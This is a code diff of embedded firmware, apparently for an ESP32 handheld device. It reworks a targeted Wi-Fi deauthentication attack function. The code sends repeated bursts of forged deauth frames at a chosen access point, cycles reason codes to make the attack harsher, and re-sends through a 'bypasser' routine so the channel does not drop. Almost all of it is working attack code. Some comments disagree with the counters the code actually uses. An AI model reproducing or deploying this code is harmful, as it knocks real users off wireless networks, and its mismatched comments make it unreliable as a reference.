@@ -744,42 +744,28 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     resetGlobalState();
     cleanlyStopWebUiForWiFiFeature();
 
-    // ล้าง WiFi แล้วตั้ง STA + promiscuous
-    WiFi.disconnect(true);
-    WiFi.mode(WIFI_OFF);
-    delay(100);
-    
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    esp_wifi_init(&cfg);
-    esp_wifi_set_mode(WIFI_MODE_STA);
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_max_tx_power(78);   // บีบกำลังส่งสูงสุด
+    // 1. ใช้ wifi_atk_setWifi() แบบที่ Flood/Clone ใช้ (APSTA)
+    if (!wifi_atk_setWifi()) return;
 
-    // เตรียม deauth frame
+    // 2. สร้าง ap_record สำหรับเป้าหมาย
+    wifi_ap_record_t target_ap;
+    memset(&target_ap, 0, sizeof(target_ap));
     uint8_t bssid[6];
     sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
+    memcpy(target_ap.bssid, bssid, 6);
+    target_ap.primary = channel;
+
+    // 3. เตรียม deauth frame และตั้งช่องครั้งแรก (ผ่าน wsl_bypasser)
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    memcpy(&deauth_frame[4], _default_target, 6);
-    memcpy(&deauth_frame[10], bssid, 6);
-    memcpy(&deauth_frame[16], bssid, 6);
+    wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
 
-    // เหตุผลต่าง ๆ สำหรับ deauth
+    // 4. ตัวแปรสำหรับเหตุผลหลากหลาย (เพิ่มความโหด)
     const uint8_t reasons[] = {0x01, 0x04, 0x07, 0x08};
-    const uint8_t numReasons = sizeof(reasons);
     uint8_t reasonIdx = 0;
-
-    // ชาแนลที่จะวิ่งวน
-    const uint8_t channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
-    const uint8_t numChannels = sizeof(channels);
-    uint8_t chIndex = 0;
-    uint8_t currentChannel = channels[0];
-    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
-
-    // loop โจมตี
-    const uint16_t UPDATE_INTERVAL_MS = 2000;
-    uint32_t lastUpdateTime = millis();
     uint32_t frameCount = 0;
+    uint32_t lastUpdateTime = millis();
+    uint32_t lastChannelRefresh = frameCount; // สำหรับนับว่าควร refresh ช่องเมื่อไหร่
     bool needsRedraw = true;
     bool attackActive = true;
 
@@ -788,41 +774,39 @@ void target_atk(String tssid, String mac, uint8_t channel) {
     tft.setTextSize(FM);
     setCpuFrequencyMhz(CONFIG_ESP_DEFAULT_CPU_FREQ_MHZ);
 
+    // 5. วนโจมตี
     while (attackActive) {
         if (needsRedraw) {
-            drawMainBorderWithTitle("Target Deauth (BEAST)");
+            drawMainBorderWithTitle("Target Deauth");
             padprintln("");
             padprintln("AP: " + tssid);
-            padprintln("MAC: " + mac);
-            padprintln("Chan: " + String(currentChannel));
-            padprintln("Reason: 0x" + String(reasons[reasonIdx], HEX));
+            padprintln("Channel: " + String(channel));
+            padprintln(mac);
             vTaskDelay(50 / portTICK_PERIOD_MS);
             needsRedraw = false;
         }
 
-        // ----- โจมตีเป็นชุด (burst) -----
-        for (int i = 0; i < 5; i++) {           // ยิง 5 รอบ x3 เฟรม = 15 เฟรมต่อลูป
-            deauth_frame[24] = reasons[reasonIdx]; // เปลี่ยน reason code
+        // --- ยิงเป็นชุด 5 ครั้ง (15 เฟรม) ---
+        for (int i = 0; i < 5; i++) {
+            deauth_frame[24] = reasons[reasonIdx];   // เปลี่ยนเหตุผล
             send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-            frameCount += 3;
+            frameCount++;
         }
 
-        // เปลี่ยน reason code ทุก 50 เฟรม (ประมาณ 10 รอบ burst)
-        if (frameCount % 50 == 0) {
-            reasonIdx = (reasonIdx + 1) % numReasons;
+        // เปลี่ยน reason code ทุก ๆ 100 เฟรม
+        if (frameCount % 20 == 0) {  // 20 * 5 = 100 รอบ send_raw_frame
+            reasonIdx = (reasonIdx + 1) % 4;
         }
 
-        // เปลี่ยนชาแนลทุก 200 เฟรม (40 รอบ burst) เพื่ออยู่นานขึ้น
-        if (frameCount % 200 == 0) {
-            chIndex = (chIndex + 1) % numChannels;
-            currentChannel = channels[chIndex];
-            esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
-            needsRedraw = true;
+        // ** สำคัญ **: ทุก ๆ 1000 เฟรม (200 รอบ burst) ให้ refresh ช่องสัญญาณ
+        // ด้วยการเรียก wsl_bypasser_send_raw_frame อีกครั้ง กันช่องหลุด
+        if (frameCount % 200 == 0) {  // 200 * 5 = 1000 รอบ send_raw_frame
+            wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
         }
 
-        // อัปเดต FPS
-        if (millis() - lastUpdateTime >= UPDATE_INTERVAL_MS) {
-            float fps = (frameCount * 1000.0) / (millis() - lastUpdateTime);
+        // อัปเดต FPS ทุก 2 วิ
+        if (millis() - lastUpdateTime >= 2000) {
+            float fps = (frameCount * 15) / 2.0;  // frameCount นับเป็นรอบ burst แต่ละรอบมี 15 เฟรม
             tft.setCursor(tftWidth * 0.05, tftHeight - (tftHeight * 0.08));
             tft.print("Frames: " + String((int)fps) + "/s   ");
             frameCount = 0;
@@ -841,8 +825,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
         }
     }
 
-    esp_wifi_set_promiscuous(false);
-    WiFi.mode(WIFI_OFF);
+    wifi_atk_unsetWifi();
     returnToMenu = true;
 }
 
